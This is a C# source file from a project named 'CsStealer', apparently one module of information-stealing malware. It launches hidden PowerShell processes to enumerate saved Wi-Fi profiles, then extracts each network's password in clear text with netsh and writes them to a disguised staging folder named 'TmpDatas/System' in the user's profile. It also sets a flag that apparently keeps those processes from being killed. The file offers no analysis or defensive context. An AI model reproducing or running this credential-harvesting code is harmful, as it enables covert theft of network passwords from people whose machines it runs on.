using System;
using System.Diagnostics;
using System.Text;

namespace CsStealer
{
    public class WiFi
    {
        public static string OutputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "TmpDatas", "System");
        
        public static void GetAllWifis()
        {
            string DistDir = Path.Combine(OutputDir, "Wifis");

            Process WifiInfos = new Process();

            Blockers.PowershellCanBeKilled = false;

            WifiInfos.StartInfo.FileName = "powershell.exe";
            WifiInfos.StartInfo.Arguments = "netsh wlan show profiles";
            WifiInfos.StartInfo.CreateNoWindow = true;
            WifiInfos.StartInfo.RedirectStandardOutput = true;
            WifiInfos.StartInfo.UseShellExecute = false;

            WifiInfos.Start();

            string Output = WifiInfos.StandardOutput.ReadToEnd();

            WifiInfos.WaitForExit();

            if (!string.IsNullOrEmpty(Output))
            {
                string[] OutLines = Output.Split("\n");

                foreach (string Line in OutLines)
                {
                    try
                    {
                        if (Line.Trim().Split(":").Length == 2)
                        {
                            string WifiName = Line.Trim().Split(":")[1];

                            if (string.IsNullOrEmpty(WifiName))
                            {
                                continue;
                            }

                            string OutF = Path.Combine(DistDir, $"{WifiName}.txt");
                            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

                            Process GetKey = new Process();

                            GetKey.StartInfo.FileName = "powershell.exe";
                            GetKey.StartInfo.Arguments = $"netsh wlan show profile name=\"{WifiName}\" key=clear";
                            GetKey.StartInfo.UseShellExecute = false;
                            GetKey.StartInfo.CreateNoWindow = true;
                            GetKey.StartInfo.RedirectStandardOutput = true;

                            GetKey.Start();

                            string _Output = GetKey.StandardOutput.ReadToEnd();

                            GetKey.WaitForExit();

                            if (GetKey.ExitCode == 0)
                            {
                                if (!Directory.Exists(DistDir)) Directory.CreateDirectory(DistDir);
                                File.WriteAllText(OutF, _Output.Replace("é", "e").Replace("è", "e").Replace("'", " ").Replace("à", "a"), encoding: Encoding.UTF8);
                                Debugger.Debug("INFO", $"Saved {WifiName}");
                            }
                        }
                    }
                    catch
                    {

                    }

                }
            }

            Blockers.PowershellCanBeKilled = true;

        }
    }
}